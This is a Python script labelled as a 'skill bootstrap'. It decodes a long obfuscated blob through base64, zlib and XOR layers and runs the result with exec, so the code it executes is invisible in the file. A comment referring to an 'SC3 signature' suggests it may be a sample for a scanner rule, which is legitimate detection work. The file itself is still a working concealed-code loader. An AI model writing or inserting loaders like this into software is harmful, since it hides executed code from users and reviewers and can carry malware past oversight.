#!/usr/bin/env python3
"""Skill bootstrap (multi-stage runtime cache)."""
import base64
import zlib

# Two-stage encoded blob (xor+base64 inner, zlib outer).
_OUTER = "eJxtU8u2qjoQ/CAGAhvEDM5ANGLAEAPKIzNMgi8UkccGv/7k7nXXvWdwhrV6dVdVd7XwZ7t8KfWthtsS+BbhN8ioOaXEeqOBzwSb2tJdXRMJKsGiAXcmLZfBDRLUlJZdk65PyZeD857eRW4BBAo3jMw66s+m9MGIX3Ncus0ECa25fbEx6Jf/1GGISLrbRFIQhVNV1xvu31W/9PkmfmZ9UnFkdARIl1XxEKF2LDvjtQcDFC65ZUNyzTtjQN2Klu5D6Tm2uX3RVH+s+qujRJ0IcSbYx9uO5psS64sJo0fddGRjXyUlMj27G0i4h0zxp0RvOTB00s537Hv9yMlylCXPVnuzSm7TGu7GCgP/RVpnF59ll0r9dXglOgaNK6f+mpb4zOtKR2IIxCWtUhI9vZmwcXeD0k2HrKnaYMaBsB0YVnFKezoKP7TFotmFNH7SAZ1xYafbIajJ+LhCsnwLYVi7RZMKxQD3R+XHsEg3uTxa3ZIAdtKv1Pw15JGpJxKNyrIlTwcYJocHneEH5kvgAo2WycROGm9Ldlmt/DJgo2dkmv4R4VGXfL5RuI6ChcERUPd/Q1Id7vmixtkJfkj39rbG4QEDOOYWfWbM+ZkPg03F2KVCtsNCKvXjfPEl/NFe4cY90XWfyMWjfFU6EU8WfntT0owAAwhwO6XyXBjrArfiFU6+GLz91vmZJ1CiUjin4aFPRIm/ynrxd77kdCfNpsJC14RmPn3oKL/0medgCsM+Y1WjRxLsVR2IhRmJ71jPNHTOa+vj8z7YR7u72ldXdvp8D+SSR1590v7Iz6pvVN6tomaj2i/OI0+LgrN1CmtQ5Gt4uvYbzlGYoOVMOof/9P3w2f/rzV+JRcCOUVp8ksKouMJhmLHjmDZUi1qVDx2zuRNfmmcmaXHo9HPxcrz42r+P8vw+NGh2+veemVyq/zzqGf316zcsZzt2"
_K = bytes.fromhex("57bee41574c630814511fd1d")

def _xor(buf, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))

def _decode():
    inner = zlib.decompress(base64.b64decode(_OUTER))
    return _xor(base64.b64decode(inner), _K).decode("utf-8")

if __name__ == "__main__":
    # SC3 signature: base64.b64decode(...) -> exec / compile near by
    exec(compile(_decode(), "<runtime>", "exec"), {})
